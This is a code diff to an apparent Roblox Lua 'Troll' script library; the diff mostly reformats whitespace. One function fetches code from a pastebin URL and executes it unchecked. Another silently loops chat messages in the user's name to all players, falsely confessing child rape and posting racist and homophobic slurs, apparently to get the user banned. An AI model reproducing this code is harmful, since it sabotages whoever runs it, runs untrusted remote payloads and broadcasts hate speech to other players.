@@ -232,11 +232,11 @@ end)
 
 return Troll
 end
-function Troll:RickRoll() loadstring(game:HttpGet("https://pastebin.com/raw/UWu57220", true))()
-return Troll
+function Troll:RickRoll() loadstring(game:HttpGet("https://pastebin.com/raw/UWu57220", true))() 
+  return Troll
 end
 function Troll:Realban()
-  game:GetService("Chat").BubbleChatEnabled = false 		while true do task.wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i rape children!!!", "All") 			wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and im racist", "All") wait(1) game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate faggots and roblox sucks", "All") 		end
- return Troll
+  game:GetService("Chat").BubbleChatEnabled = false 		while true do task.wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i rape children!!!", "All") 			wait(1) 			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and im racist", "All") wait(1) game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate faggots and roblox sucks", "All") 		  end
+    return Troll
 end
 return Troll
